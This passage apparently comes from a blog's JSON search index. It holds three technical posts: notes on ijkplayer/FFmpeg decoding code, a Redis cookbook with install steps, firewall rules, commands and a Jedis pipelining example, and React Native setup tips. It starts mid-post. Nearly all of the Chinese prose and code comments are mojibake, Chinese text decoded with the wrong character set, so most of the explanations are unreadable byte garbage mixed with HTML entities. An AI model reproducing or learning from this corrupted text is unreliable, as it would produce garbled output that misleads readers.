//æ‰“å¼€åª’ä½“æ•°æ®ï¼Œå¾—åˆ°çš„æ˜¯éŸ³è§†é¢‘åˆ†ç¦»çš„è§£ç å‰æ•°æ® ret = av_read_frame(ic, pkt); for (;;) { //æ³¨æ„è¿™é‡Œå†™äº†ä¸€ä¸ªå¾ªç¯ï¼Œæ‰€ä»¥ä¸‹é¢çš„è¿‡ç¨‹æ˜¯æŒç»­çš„ if (is-&gt;abort_request) break; } //æ¯æ¬¡è¯»å–ä¸€éƒ¨åˆ†æ•°æ®å°±è°ƒç”¨ffmpeg apiå¾€åæŒªä¸€ç‚¹ ret = avformat_seek_file(is-&gt;ic, -1, seek_min, seek_target, seek_max, is-&gt;seek_flags); if (is-&gt;audio_stream &gt;= 0) { //æŠŠéŸ³é¢‘æ”¾è¿›é˜Ÿåˆ— packet_queue_flush(&amp;is-&gt;audioq); packet_queue_put(&amp;is-&gt;audioq, &amp;flush_pkt); // TODO: clear invaild audio data // SDL_AoutFlushAudio(ffp-&gt;aout); } if (is-&gt;subtitle_stream &gt;= 0) { //æŠŠå­—å¹•æ”¾è¿›é˜Ÿåˆ— packet_queue_flush(&amp;is-&gt;subtitleq); packet_queue_put(&amp;is-&gt;subtitleq, &amp;flush_pkt); } if (is-&gt;video_stream &gt;= 0) { //æŠŠè§†é¢‘æ•°æ®æ”¾è¿›é˜Ÿåˆ— if (ffp-&gt;node_vdec) { ffpipenode_flush(ffp-&gt;node_vdec); } packet_queue_flush(&amp;is-&gt;videoq); packet_queue_put(&amp;is-&gt;videoq, &amp;flush_pkt); } } stream_component_openä¸­æ ¹æ®æ•°æ®çš„ç±»å‹ï¼Œåˆ†åˆ«åˆ›å»ºéŸ³é¢‘è§£ç å™¨ï¼Œè§†é¢‘è§£ç å™¨æˆ–æ˜¯å­—å¹•è§£ç å™¨ static int stream_component_open(FFPlayer *ffp, int stream_index){ ... switch (avctx-&gt;codec_type) { case AVMEDIA_TYPE_AUDIO : is-&gt;last_audio_stream = stream_index; forced_codec_name = ffp-&gt;audio_codec_name; break; case AVMEDIA_TYPE_SUBTITLE: is-&gt;last_subtitle_stream = stream_index; forced_codec_name = ffp-&gt;subtitle_codec_name; break; case AVMEDIA_TYPE_VIDEO : is-&gt;last_video_stream = stream_index; forced_codec_name = ffp-&gt;video_codec_name; break; default: break; } ... } static IJKFF_Pipenode *func_open_video_decoder(IJKFF_Pipeline *pipeline, FFPlayer *ffp) { IJKFF_Pipeline_Opaque *opaque = pipeline-&gt;opaque; IJKFF_Pipenode *node = NULL; if (ffp-&gt;mediacodec_all_videos || ffp-&gt;mediacodec_avc || ffp-&gt;mediacodec_hevc || ffp-&gt;mediacodec_mpeg2) node = ffpipenode_create_video_decoder_from_android_mediacodec(ffp, pipeline, opaque-&gt;weak_vout); //å¦‚æœè®¾ç½®äº†optionåˆ™é€‰ç”¨mediaCode if (!node) { //å¦åˆ™ä½¿ç”¨ffmpeg node = ffpipenode_create_video_decoder_from_ffplay(ffp); } return node; } è§†é¢‘è¾“å‡ºä¸ç®¡è§†é¢‘è§£ç è¿˜æ˜¯éŸ³é¢‘è§£ç ï¼Œå…¶åŸºæœ¬æµç¨‹éƒ½æ˜¯ä»è§£ç å‰çš„æ•°æ®ç¼“å†²åŒºä¸­å–å‡ºä¸€å¸§æ•°æ®è¿›è¡Œè§£ç ï¼Œå®Œæˆåæ”¾å…¥ç›¸åº”çš„è§£ç åçš„æ•°æ®ç¼“å†²åŒº éŸ³é¢‘è¾“å‡ºijkplayerä¸­Androidå¹³å°ä½¿ç”¨OpenSL ESæˆ–AudioTrackè¾“å‡ºéŸ³é¢‘ï¼ŒiOSå¹³å°ä½¿ç”¨AudioQueueè¾“å‡ºéŸ³é¢‘ã€‚ è§†é¢‘çš„éŸ³è§†é¢‘åŒæ­¥é€šå¸¸éŸ³è§†é¢‘åŒæ­¥çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯é€‰æ‹©ä¸€ä¸ªå‚è€ƒæ—¶é’Ÿï¼Œæ’­æ”¾æ—¶è¯»å–éŸ³è§†é¢‘å¸§ä¸Šçš„æ—¶é—´æˆ³ï¼ŒåŒæ—¶å‚è€ƒå½“å‰æ—¶é’Ÿå‚è€ƒæ—¶é’Ÿä¸Šçš„æ—¶é—´æ¥å®‰æ’æ’­æ”¾ijkplayeråœ¨é»˜è®¤æƒ…å†µä¸‹ä¹Ÿæ˜¯ä½¿ç”¨éŸ³é¢‘ä½œä¸ºå‚è€ƒæ—¶é’Ÿæºï¼Œå¤„ç†åŒæ­¥çš„è¿‡ç¨‹ä¸»è¦åœ¨è§†é¢‘æ¸²æŸ“video_refresh_threadçš„çº¿ç¨‹ä¸­ï¼š ijkplayerç°åœ¨çœ‹æ¥ä¼¼ä¹åªæ˜¯ffmpegçš„ä¸€å±‚wrapper MediaCodecåº”è¯¥å°±æ˜¯ç¡¬è§£ï¼Œffmpegæ˜¯è½¯è§£(åé¢å¥½åƒæ”¯æŒäº†ç¡¬è§£) å‚è€ƒ Ijkplayerè§£æffmpeg cè¯­è¨€å†™ä¸€ä¸ªvideo playerffmpegçš„node js åŒ…è£…nginxæ­å»ºrtmpæ¨æµæœåŠ¡ijkplayerå¦‚ä½•ä½¿ç”¨FFmpeg 4.0å†…æ ¸ï¼Ÿå¾®ä¿¡Androidè§†é¢‘ç¼–ç çˆ¬è¿‡çš„é‚£äº›å‘ ä½¿ç”¨NeonæŒ‡ä»¤Bç«™æœ‰ä¸€ä¸ªAndroidVideoCacheé€šè¿‡æœ¬åœ°ServerSocketçš„å½¢å¼å®ç°äº†è¾¹çœ‹è¾¹ç¼“å­˜ å…·ä½“å®ç°æ˜¯è¯»çš„æ—¶å€™è¯»æ‰€åœ¨çš„çº¿ç¨‹æ¯éš”ä¸€ç§’wait(1000)(è¿™ä¸€ç§’ä¸­å…¶å®è¯»å–è¿œç¨‹serveræ•°æ®çš„çº¿ç¨‹ä¸€ç›´åœ¨è·‘)ç„¶åå»è¯»ï¼Œå¾ˆå¥½çš„æ¡†æ¶ã€‚ tbdopencvplay video using ffmplayermediaCodecçš„æ•™ç¨‹grafika","tags":[]},{"title":"redis-cook-book","date":"2018-01-20T08:19:20.000Z","path":"2018/01/20/2018-01-20-redis-cook-book/","text":"redisé€Ÿåº¦ç›¸å½“å¿« åœ¨ubuntuä¸Šå®‰è£…ï¼Œå·æ‡’å°±ç›´æ¥ç”¨è¿™ç§æ–¹å¼å§ï¼Œæ¯”è‡ªå·±ä¸‹è½½æºç ç¼–è¯‘å¿«ï¼Œè¿˜è¿systemdè„šæœ¬éƒ½å†™å¥½äº†ã€‚å½“ç„¶ç¼ºç‚¹å°±æ˜¯/etc/apt/source.listæ–‡ä»¶é‡Œé¢çš„æºå¤ªè€çš„ç¼˜æ•…ã€‚æ®è¯´apt-getæœ€å¤šå°±èƒ½è£…ä¸Š3.2çš„redisäº†ï¼Œubuntuæ›´æ–°æœ€æ–°è½¯ä»¶æœ€æ–°ç‰ˆæœ¬ä¹Ÿä¸ä¼šé‚£ä¹ˆå¿« sudo add-apt-repository ppa:chris-lea/redis-serversudo apt-get updatesudo apt-get install redis-server sudo apt-get install redis-server how-to-install-redis-on-ubuntu-16-04 ä¹Ÿæœ‰è‡ªå·±ä¸‹æºç ç¼–è¯‘çš„macä¸Šå°±æ˜¯ä¸‹è½½ä¸€ä¸ªtar.gzï¼Œç„¶åè‡ªå·±makeï¼Œç½‘ä¸Šæ•™ç¨‹éƒ½å¾ˆå¤šçš„ The Redis project does not officially support Windows. However, the Microsoft Open Tech group develops and maintains this Windows port targeting Win64. ç›´æ¥ä»release pageä¸‹è½½msiæ–‡ä»¶ï¼Œå®‰è£…ä¸‹å»å¾ˆæ–¹ä¾¿çš„ã€‚é»˜è®¤çš„ç«¯å£æ˜¯6379ã€‚ start server and client(windowsä¸‹cd åˆ°rediså®‰è£…çš„ä½ç½®ï¼Œé»˜è®¤åœ¨Cï¼šPorgram Files/Redisé‡Œé¢) redis-server redis.windows.confåŒå‡»æ‰“å¼€ redis-cli.exe ## start client åœ¨macä¸‹è¿è¡Œserver: redis-server ## èµ·æœåŠ¡ç«¯redis-cli ## èµ·å®¢æˆ·ç«¯redis-cli ping ## çœ‹ä¸‹æœåŠ¡ç«¯æœ‰æ²¡æœ‰èµ·æ¥redis-cli shutdown ## å…³é—­å®¢æˆ·ç«¯ å¼€äº†è¦ä¼šå…³é—­ ç¦æ­¢ä»»ä½•remoteè®¿é—® To make it automatically start with Linuxsudo systemctl enable redis_6379 To block all remote traffic to Redis except for local and one IP address (e.g. your web server)iptables -A INPUT -p tcp â€“dport 6379 -s 127.0.0.1 -j ACCEPTiptables -A INPUT -p tcp â€“dport 6379 -s X.X.X.X -j ACCEPTiptables -A INPUT -p tcp â€“dport 6379 -j DROP å’Œæ•°æ®åº“ç±»ä¼¼ï¼Œä¸åŒä¸šåŠ¡çš„æ•°æ®éœ€è¦å­˜è´®åœ¨ä¸åŒçš„æ•°æ®åº“ä¸­ï¼Œredisæä¾›äº†clientç«¯çš„åˆ‡æ¢æ•°æ®åº“çš„è¯­æ³• select 1 ## æ¯ä¸ªæ•°æ®åº“ä¹‹é—´çš„keyä¸å†²çª Configurations sudo find / -name â€œredis.confâ€ ## linuxä¸‹åº”è¯¥æ˜¯è£…åˆ°äº†/etc/redis/è¿™ä¸ªç›®å½•ä¸‹ï¼Œä¸ç¡®å®šçš„è¯findä¸€ä¸‹ å¸¸è§çš„é…ç½®åŒ…æ‹¬ï¼š port 6379 ## redis-serverç›‘å¬ç«¯å£ï¼ˆé»˜è®¤6379ï¼‰requirepass ## æŒ‡å®šå®¢æˆ·ç«¯æ“ä½œéœ€è¦çš„å¯†ç databases 16 ## è¿™é‡Œé¢å¯¹äºå¯ä¾›é€‰æ‹©çš„æ•°æ®åº“æ€»æ•° é”™è¯¯å¤„ç†å½“å†…å­˜è¾¾åˆ°æœ€å¤§å€¼çš„æ—¶å€™Redisä¼šé€‰æ‹©åˆ é™¤å“ªäº›æ•°æ®ï¼Ÿæœ‰äº”ç§æ–¹å¼å¯ä¾›é€‰æ‹© volatile-lru -&gt; åˆ©ç”¨LRUç®—æ³•ç§»é™¤è®¾ç½®è¿‡è¿‡æœŸæ—¶é—´çš„key (LRU:æœ€è¿‘ä½¿ç”¨ Least Recently Used )allkeys-lru -&gt; åˆ©ç”¨LRUç®—æ³•ç§»é™¤ä»»ä½•keyvolatile-random -&gt; ç§»é™¤è®¾ç½®è¿‡è¿‡æœŸæ—¶é—´çš„éšæœºkeyallkeys-&gt;random -&gt; remove a random key, any keyvolatile-ttl -&gt; ç§»é™¤å³å°†è¿‡æœŸçš„key(minor TTL)noeviction -&gt; ä¸ç§»é™¤ä»»ä½•å¯ä»¥ï¼Œåªæ˜¯è¿”å›ä¸€ä¸ªå†™é”™è¯¯ æ”¯æŒçš„å­˜å‚¨ç±»å‹ Strings Hashes Lists Sets Sorted Sets é’ˆå¯¹å„ç§æ•°æ®è¿›è¡ŒCURDæ“ä½œæœ€ç®€å•çš„SETå’ŒGETä¸¾ä¸ªä¾‹å­ &gt;&gt;SET realname &quot;John Smith&quot; ##äº²æµ‹ï¼Œè¿™ä¸ªrealnameçš„keyåŠ ä¸åŠ å¼•å·æ²¡å•¥å…³ç³»ï¼Œvalueä¹Ÿæ˜¯åŠ ä¸åŠ å¼•å·æ²¡å…³ç³».SETå‘½ä»¤ç›´æ¥æ— è§†åŒå¼•å· &gt;&gt;OK &gt;&gt; GET realname &quot;John Smith&quot; String set(key, value)ï¼šç»™æ•°æ®åº“ä¸­åç§°ä¸ºkeyçš„stringèµ‹äºˆå€¼value get(key)ï¼šè¿”å›æ•°æ®åº“ä¸­åç§°ä¸ºkeyçš„stringçš„value getset(key, value)ï¼šç»™åç§°ä¸ºkeyçš„stringèµ‹äºˆä¸Šä¸€æ¬¡çš„value mget(key1, key2,â€¦, key N)ï¼šè¿”å›åº“ä¸­å¤šä¸ªstringçš„value setnx(key, value)ï¼šæ·»åŠ stringï¼Œåç§°ä¸ºkeyï¼Œå€¼ä¸ºvalue setex(key, time, value)ï¼šå‘åº“ä¸­æ·»åŠ stringï¼Œè®¾å®šè¿‡æœŸæ—¶é—´time mset(key N, value N)ï¼šæ‰¹é‡è®¾ç½®å¤šä¸ªstringçš„å€¼ msetnx(key N, value N)ï¼šå¦‚æœæ‰€æœ‰åç§°ä¸ºkey içš„stringéƒ½ä¸å­˜åœ¨ incr(key)ï¼šåç§°ä¸ºkeyçš„stringå¢1æ“ä½œ incrby(key, integer)ï¼šåç§°ä¸ºkeyçš„stringå¢åŠ integer decr(key)ï¼šåç§°ä¸ºkeyçš„stringå‡1æ“ä½œ decrby(key, integer)ï¼šåç§°ä¸ºkeyçš„stringå‡å°‘integer append(key, value)ï¼šåç§°ä¸ºkeyçš„stringçš„å€¼é™„åŠ value substr(key, start, end)ï¼šè¿”å›åç§°ä¸ºkeyçš„stringçš„valueçš„å­ä¸² HashesA Redis hash is a collection of key value pairs. Redis Hashes are maps between string fields and string values. Hence, they are used to represent objects. Hashesç”¨äºä»£è¡¨object ## æ·»åŠ æ“ä½œ ## set redis&gt; HMSET myhash field1 &quot;Hello&quot; field2 &quot;World&quot; &quot;OK&quot; ## åªåœ¨fieldä¸å­˜åœ¨çš„æ—¶å€™æ·»åŠ ï¼Œå¯ä»¥ç†è§£ä¸ºputIfAbsent HSETNX myhash field &quot;Hello&quot; ##è¿”å›1è¡¨æ˜è®¾ç½®æˆåŠŸï¼Œè¿”å›0è¯´æ˜ä¸æˆåŠŸ ## æŸ¥è¯¢æ“ä½œ ## get redis&gt; HGET myhash field1 &quot;Hello&quot; redis&gt; HGET myhash field2 &quot;World&quot; ### delete a specified field from an object ## åˆ é™¤æ“ä½œ redis&gt; HSET myhash field1 &quot;foo&quot; redis&gt; HDEL myhash field1 ## è¿”å›0è¡¨ç¤ºä¸å­˜åœ¨è¯¥keyï¼Œè¿”å›1è¡¨ç¤ºåˆ é™¤æˆåŠŸ ##æ£€æŸ¥æ˜¯å¦å­˜åœ¨æŸä¸ªfield HEXISTS myhash field1 (integer) 1 ##1è¡¨ç¤ºå­˜åœ¨ï¼Œ0è¡¨ç¤ºä¸å­˜åœ¨ ## æŠŠæŸä¸ªå˜é‡çš„å€¼å¢åŠ  HINCRBY myhash field 1 ## è¿”å›æ“ä½œæˆåŠŸåfield çš„å½“å‰value ##æŸ¥çœ‹å½“å‰objectæœ‰å“ªäº›field,ç±»ä¼¼äºjavaScriptçš„iterating protoType HKEYS myhash ListsRedis Lists are simply lists of strings, sorted by insertion order. You can add elements to a Redis List on the head or on the tail. redis 127.0.0.1:6379&gt; lpush tutoriallist redis (integer) 1 redis 127.0.0.1:6379&gt; lpush tutoriallist mongodb (integer) 2 redis 127.0.0.1:6379&gt; lpush tutoriallist rabitmq (integer) 3 redis 127.0.0.1:6379&gt; lrange tutoriallist 0 10 1) &quot;rabitmq&quot; 2) &quot;mongodb&quot; 3) &quot;redis&quot; rpush(key, value)ï¼šåœ¨åç§°ä¸ºkeyçš„listå°¾æ·»åŠ ä¸€ä¸ªå€¼ä¸ºvalueçš„å…ƒç´  lpush(key, value)ï¼šåœ¨åç§°ä¸ºkeyçš„listå¤´æ·»åŠ ä¸€ä¸ªå€¼ä¸ºvalueçš„ å…ƒç´  llen(key)ï¼šè¿”å›åç§°ä¸ºkeyçš„listçš„é•¿åº¦ lrange(key, start, end)ï¼šè¿”å›åç§°ä¸ºkeyçš„listä¸­startè‡³endä¹‹é—´çš„å…ƒç´  ltrim(key, start, end)ï¼šæˆªå–åç§°ä¸ºkeyçš„list lindex(key, index)ï¼šè¿”å›åç§°ä¸ºkeyçš„listä¸­indexä½ç½®çš„å…ƒç´  lset(key, index, value)ï¼šç»™åç§°ä¸ºkeyçš„listä¸­indexä½ç½®çš„å…ƒç´ èµ‹å€¼ lrem(key, count, value)ï¼šåˆ é™¤countä¸ªkeyçš„listä¸­å€¼ä¸ºvalueçš„å…ƒç´  lpop(key)ï¼šè¿”å›å¹¶åˆ é™¤åç§°ä¸ºkeyçš„listä¸­çš„é¦–å…ƒç´  rpop(key)ï¼šè¿”å›å¹¶åˆ é™¤åç§°ä¸ºkeyçš„listä¸­çš„å°¾å…ƒç´  blpop(key1, key2,â€¦ key N, timeout)ï¼šlpopå‘½ä»¤çš„blockç‰ˆæœ¬ã€‚ brpop(key1, key2,â€¦ key N, timeout)ï¼šrpopçš„blockç‰ˆæœ¬ã€‚ rpoplpush(srckey, dstkey)ï¼šè¿”å›å¹¶åˆ é™¤åç§°ä¸ºsrckeyçš„listçš„å°¾å…ƒç´ ï¼Œå¹¶å°†è¯¥å…ƒç´ æ·»åŠ åˆ°åç§°ä¸ºdstkeyçš„listçš„å¤´éƒ¨ SET sadd(key, member)ï¼šå‘åç§°ä¸ºkeyçš„setä¸­æ·»åŠ å…ƒç´ member srem(key, member) ï¼šåˆ é™¤åç§°ä¸ºkeyçš„setä¸­çš„å…ƒç´ member spop(key) ï¼šéšæœºè¿”å›å¹¶åˆ é™¤åç§°ä¸ºkeyçš„setä¸­ä¸€ä¸ªå…ƒç´  smove(srckey, dstkey, member) ï¼šç§»åˆ°é›†åˆå…ƒç´  scard(key) ï¼šè¿”å›åç§°ä¸ºkeyçš„setçš„åŸºæ•° sismember(key, member) ï¼šmemberæ˜¯å¦æ˜¯åç§°ä¸ºkeyçš„setçš„å…ƒç´  sinter(key1, key2,â€¦key N) ï¼šæ±‚äº¤é›† sinterstore(dstkey, (keys)) ï¼šæ±‚äº¤é›†å¹¶å°†äº¤é›†ä¿å­˜åˆ°dstkeyçš„é›†åˆ sunion(key1, (keys)) ï¼šæ±‚å¹¶é›† sunionstore(dstkey, (keys)) ï¼šæ±‚å¹¶é›†å¹¶å°†å¹¶é›†ä¿å­˜åˆ°dstkeyçš„é›†åˆ sdiff(key1, (keys)) ï¼šæ±‚å·®é›† sdiffstore(dstkey, (keys)) ï¼šæ±‚å·®é›†å¹¶å°†å·®é›†ä¿å­˜åˆ°dstkeyçš„é›†åˆ smembers(key) ï¼šè¿”å›åç§°ä¸ºkeyçš„setçš„æ‰€æœ‰å…ƒç´  srandmember(key) ï¼šéšæœºè¿”å›åç§°ä¸ºkeyçš„setçš„ä¸€ä¸ªå…ƒç´  ä¸€äº›ç‰¹æ€§çš„æŒ‡ä»¤æŒä¹…åŒ–saveï¼šå°†æ•°æ®åŒæ­¥ä¿å­˜åˆ°ç£ç›˜ bgsaveï¼šå°†æ•°æ®å¼‚æ­¥ä¿å­˜åˆ°ç£ç›˜ lastsaveï¼šè¿”å›ä¸Šæ¬¡æˆåŠŸå°†æ•°æ®ä¿å­˜åˆ°ç£ç›˜çš„Unixæ—¶æˆ³ shundownï¼šå°†æ•°æ®åŒæ­¥ä¿å­˜åˆ°ç£ç›˜ï¼Œç„¶åå…³é—­æœåŠ¡ è®¾å®šæœ‰æ•ˆæ—¶é—´expireat å¯¹Valueçš„æ“ä½œKEYS * åˆ—å‡ºæ‰€æœ‰çš„key exists(key)ï¼šç¡®è®¤ä¸€ä¸ªkeyæ˜¯å¦å­˜åœ¨ del(key)ï¼šåˆ é™¤ä¸€ä¸ªkey type(key)ï¼šè¿”å›å€¼çš„ç±»å‹ keys(pattern)ï¼šè¿”å›æ»¡è¶³ç»™å®špatternçš„æ‰€æœ‰key randomkeyï¼šéšæœºè¿”å›keyç©ºé—´çš„ä¸€ä¸ª keyrename(oldname, newname)ï¼šé‡å‘½åkey dbsizeï¼šè¿”å›å½“å‰æ•°æ®åº“ä¸­keyçš„æ•°ç›® expireï¼šè®¾å®šä¸€ä¸ªkeyçš„æ´»åŠ¨æ—¶é—´ï¼ˆsï¼‰ ttlï¼šè·å¾—ä¸€ä¸ªkeyçš„æ´»åŠ¨æ—¶é—´ select(index)ï¼šæŒ‰ç´¢å¼•æŸ¥è¯¢ move(key, dbindex)ï¼šç§»åŠ¨å½“å‰æ•°æ®åº“ä¸­çš„keyåˆ°dbindexæ•°æ®åº“ flushdbï¼šåˆ é™¤å½“å‰é€‰æ‹©æ•°æ®åº“ä¸­çš„æ‰€æœ‰key flushallï¼šåˆ é™¤æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰key SubScribeå’ŒPublishredis 127.0.0.1:6379&gt; SUBSCRIBE redisChat Reading messages... (press Ctrl-C to quit) 1) &quot;subscribe&quot; 2) &quot;redisChat&quot; 3) (integer) 1 ## å¦èµ·ä¸€ä¸ªscreen PUBLISH redisChat &quot;Redis is a great caching technique&quot; ## å›åˆ°åˆšæ‰çš„screen : ctrl +a +d screen -r ä¸¤ä¸ªclientåŒæ—¶subscribeäº†redisChatè¿™ä¸ªè¯é¢˜ï¼Œè¡¨ç°ä¸Šå°±å’Œå±€åŸŸç½‘èŠå¤©ä¸€æ ·ã€‚ä¹Ÿå°±æœ‰äº†å¾ˆå¤šç”¨js+webSocketå†™çš„ç®€æ˜“èŠå¤©å®¤ pipeliningä¸€æ¬¡è¯·æ±‚/å“åº”æœåŠ¡å™¨èƒ½å®ç°å¤„ç†æ–°çš„è¯·æ±‚å³ä½¿æ—§çš„è¯·æ±‚è¿˜æœªè¢«å“åº”ã€‚è¿™æ ·å°±å¯ä»¥å°†å¤šä¸ªå‘½ä»¤å‘é€åˆ°æœåŠ¡å™¨ï¼Œè€Œä¸ç”¨ç­‰å¾…å›å¤ï¼Œæœ€ååœ¨ä¸€ä¸ªæ­¥éª¤ä¸­è¯»å–è¯¥ç­”å¤ã€‚çœå»äº†RTT(Round Trip deplay time)çš„æ—¶é—´ã€‚ épiplelineæ¨¡å¼ï¼š Request----&gt;æ‰§è¡Œ ----&gt;Response Request----&gt;æ‰§è¡Œ ----&gt;Response Pipelineæ¨¡å¼ä¸‹ï¼š Request----&gt;æ‰§è¡Œï¼ŒServerå°†å“åº”ç»“æœé˜Ÿåˆ—åŒ– Request----&gt;æ‰§è¡Œï¼ŒServerå°†å“åº”ç»“æœé˜Ÿåˆ—åŒ– ----&gt;Response ----&gt;Response å’Œå…¶ä»–è¯­è¨€çš„æ•´åˆæ”¯æŒçš„lanaguage client javaScriptnpm install redisåœ¨ Node.js åº”ç”¨ä¸­é›†æˆ Redis jedisjava public void pipeline(){ String key = &quot;pipeline-test&quot;; String old = jedis.get(key); if(old != null){ System.out.println(&quot;Key:&quot; + key + &quot;,old value:&quot; + old); } //ä»£ç æ¨¡å¼1,è¿™ç§æ¨¡å¼æ˜¯æœ€å¸¸è§çš„æ–¹å¼ Pipeline p1 = jedis.pipelined(); p1.incr(key); System.out.println(&quot;Request incr&quot;); p1.incr(key); System.out.println(&quot;Request incr&quot;); //ç»“æŸpipelineï¼Œå¹¶å¼€å§‹ä»ç›¸åº”ä¸­è·å¾—æ•°æ® List&lt;Object&gt; responses = p1.syncAndReturnAll(); if(responses == null || responses.isEmpty()){ throw new RuntimeException(&quot;Pipeline error: no response...&quot;); } for(Object resp : responses){ System.out.println(&quot;Response:&quot; + resp.toString());//æ³¨æ„ï¼Œæ­¤å¤„respçš„ç±»å‹ä¸ºLong } //ä»£ç æ¨¡å¼2 Pipeline p2 = jedis.pipelined(); Response&lt;Long&gt; r1 = p2.incr(key); try{ r1.get(); }catch(Exception e){ System.out.println(&quot;Error,you cant get() before sync,because IO of response hasn&#39;t begin..&quot;); } Response&lt;Long&gt; r2 = p2.incr(key); p2.sync(); System.out.println(&quot;Pipeline,mode 2,---&gt;&quot; + r1.get()); System.out.println(&quot;Pipeline,mode 2,---&gt;&quot; + r2.get()); } pythonredis-pyä½¿ç”¨Pythonæ“ä½œRedis åº”ç”¨åœºæ™¯ ã€ŠRedis Cookbookã€‹å¯¹è¿™ä¸ªç»å…¸åœºæ™¯è¿›è¡Œè¯¦ç»†æè¿°ã€‚å‡å®šæˆ‘ä»¬å¯¹ä¸€ç³»åˆ—é¡µé¢éœ€è¦è®°å½•ç‚¹å‡»æ¬¡æ•°ã€‚ä¾‹å¦‚è®ºå›çš„æ¯ä¸ªå¸–å­éƒ½è¦è®°å½•ç‚¹å‡»æ¬¡æ•°ï¼Œè€Œç‚¹å‡»æ¬¡æ•°æ¯”å›å¸–çš„æ¬¡æ•°çš„å¤šå¾—å¤šã€‚å¦‚æœä½¿ç”¨å…³ç³»æ•°æ®åº“æ¥å­˜å‚¨ç‚¹å‡»ï¼Œå¯èƒ½å­˜åœ¨å¤§é‡çš„è¡Œçº§é”äº‰ç”¨ã€‚æ‰€ä»¥ï¼Œç‚¹å‡»æ•°çš„å¢åŠ ä½¿ç”¨redisçš„INCRå‘½ä»¤æœ€å¥½ä¸è¿‡äº†ã€‚ å­˜å‚¨å¤šå±‚æ¬¡çº§åˆ«çš„objectRedis strings vs Redis hashes to represent JSON: efficiency? ç”±äºrediså„ç§commandsæœ¬è´¨ä¸Šåªèƒ½å­˜å‚¨key-valueå½¢å¼çš„objectï¼Œå¯¹äºå¤šå±‚çº§çš„objectï¼Œéœ€è¦å°†keyæ‰å¹³åŒ– var house = { roof: { color: &#39;black&#39; }, street: &#39;Market&#39;, buildYear: &#39;1996&#39; }; HMSET house:1 roof â€œhouse:1:roofâ€ street â€œMarketâ€ buildYear â€œ1996â€ åœ¨redisä¸­å­˜å‚¨å…³ç³»å‹æ•°æ® åœ¨redisä¸­ç¼“å­˜session session å¯ä»¥å­˜æ”¾åœ¨ 1ï¼‰å†…å­˜ã€2ï¼‰cookieæœ¬èº«ã€3ï¼‰redis æˆ– memcached ç­‰ç¼“å­˜ä¸­ï¼Œæˆ–è€…4ï¼‰æ•°æ®åº“ä¸­ã€‚çº¿ä¸Šæ¥è¯´ï¼Œç¼“å­˜çš„æ–¹æ¡ˆæ¯”è¾ƒå¸¸è§ï¼Œå­˜æ•°æ®åº“çš„è¯ï¼ŒæŸ¥è¯¢æ•ˆç‡ç›¸æ¯”å‰ä¸‰è€…éƒ½å¤ªä½ï¼Œä¸æ¨è ================================================================================= Redis Cluster(é›†ç¾¤)Redisé›†ç¾¤éœ€è¦ç‰ˆæœ¬3.0ä»¥ä¸Šï¼Œå¦å¤–èµ·å¤šä¸ªå®ä¾‹å°±æ˜¯å¤åˆ¶/usr/local/redis-serverç­‰æ–‡ä»¶å¤šéå› ä¸ºç‰¹åˆ«åƒå†…å­˜ï¼Œå°å†…å­˜vpsä¸Šä¸è¦ä¹±æ è®ºè¿°Rediså’ŒMemcachedçš„å·®å¼‚-åšå®¢-äº‘æ –ç¤¾åŒº-é˜¿é‡Œäº‘ redis-server.service: Failed to run â€˜start-preâ€™ task: No such file or directory å‚è€ƒredis official docsRedis supports 5 types of data typesRedis é«˜çº§ç‰¹æ€§ä¸æ€§èƒ½è°ƒä¼˜å¤§éƒ¨åˆ†è¯­å¥è½¬è½½è‡ªå…³äºpipeliningçš„è§£é‡Š","tags":[]},{"title":"react-native-cookbook","date":"2018-01-19T22:28:34.000Z","path":"2018/01/19/2018-01-19-react-native-cookbook/","text":"æ›´æ–°2020å¹´ä¸å†æ¨èä½¿ç”¨react native cliåœ¨macä¸Šä½¿ç”¨è¿™ç§å‘½ä»¤å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„react native appï¼Œè‡ªåŠ¨æ‹‰èµ·ä¸€ä¸ªsimulatorï¼Œè¿è¡Œè¿™ä¸ªappã€‚ npx react-native init AwesomeProject cd AwesomeProject npx react-native run-ios tipsåœ¨androidæ‰‹æœºä¸Šæ‰“å¼€æ˜¾ç¤ºå¸ƒå±€è¾¹ç•Œï¼Œå‘ç°react-native appå¹¶ä¸æ˜¯ä¸€ä¸ªwebviewï¼Œè€Œæ˜¯ä¸€ä¸ªä¸ªå®åœ¨çš„buttom,textã€‚ ç›®å‰æš‚ä¸æ”¯æŒjava 9Double tap R on your keyboard to reloadå…¶å®å¹¶ä¸æ˜¯æŒ‰ç”µè„‘é”®ç›˜ä¸Šçš„Rï¼Œè€Œæ˜¯æ¨¡æ‹Ÿå™¨ä¸Šçš„ï¼Œæ‰€ä»¥éœ€è¦é¼ æ ‡ä¸Šå»ï¼Œctrl+må³å¯å¦‚æœæ˜¯ä¸€å°çœŸå®æ‰‹æœºçš„è¯ï¼Œéœ€è¦æ‘‡ä¸€æ‘‡æ‰‹æœºï¼Œå°±èƒ½æ˜¾ç¤ºèœå•ã€‚ä½†æ˜¯æ¯æ¬¡éƒ½è¦æ‘‡ä¸€æ‘‡å®åœ¨æ˜¯å¤ªéº»çƒ¦ï¼Œæ‰€ä»¥ç‚¹ä¸€ä¸‹é‚£ä¸ªEnable LiveReloadå°±èƒ½åœ¨æ¯æ¬¡ä¿å­˜æ–‡ä»¶åReloadã€‚ npm run startæ˜¯ç”¨æ¥èµ·dev serverçš„ã€‚react-native run-androidæ˜¯ç”¨æ¥å‘clientç«¯æ¨æ›´æ–°çš„ã€‚ could not connect to development serverâ€¦çš„åŸå› å°±æ˜¯æ²¡æœ‰è¿è¡Œnpm startã€‚ æ‰€ä»¥ï¼Œæ­£å¸¸çš„æµç¨‹åº”è¯¥æ˜¯npm start &amp;&amp; react-native run-android debug:react-native run-androidæ˜¯æŠŠè¿™ä¸ªAppå®‰è£…åˆ°æ‰‹æœºä¸Šï¼Œç„¶återminalå°±è¿”å›äº†ï¼Œéœ€è¦æŸ¥çœ‹åç»­æ—¥å¿—è¾“å‡ºçš„è¯react-native log-android // è¿™ä¸ªæ˜¯å¸®åŠ©åœ¨consoleä¸­è¾“å‡ºlog routereact-navigation 